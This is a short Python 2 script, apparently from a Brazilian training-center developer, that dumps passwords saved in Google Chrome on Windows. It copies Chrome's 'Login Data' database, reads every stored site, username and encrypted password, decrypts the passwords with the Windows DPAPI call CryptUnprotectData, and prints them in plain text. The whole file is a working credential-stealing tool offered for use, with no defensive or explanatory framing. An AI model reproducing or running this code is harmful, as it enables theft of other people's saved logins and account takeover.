#!/usr/bin/python
#-*-coding:utf-8-*-

#####################################################
#                                                   #
#   UNICIV - Centro de Inovação VincIT              #
#   https://www.uniciv.com.br                       #
#                                                   #
#   Desenvolvedor: h1s0k4                           #
#   E-mail: willian_brito00@hotmail.com             #
#                                                   #
#   USAGE: python chrome_pass.py                    #
#                                                   #
#####################################################

import os
import sqlite3
import shutil
import win32crypt

banco = os.getenv("LOCALAPPDATA") + \
		"\\Google\\Chrome\\User Data\\Default\\Login Data"

banco2 = banco +"2"

shutil.copyfile(banco, banco2)	
conexao = sqlite3.connect(banco2)

consulta = conexao.cursor()
consulta.execute("SELECT action_url, username_value, password_value FROM logins")

for site, login, senha in consulta.fetchall():
	print site + "\n" + login
	senha = win32crypt.CryptUnprotectData(senha)
	print senha[1].decode("ISO-8859-1") + "\n"

conexao.close()
os.remove(banco2)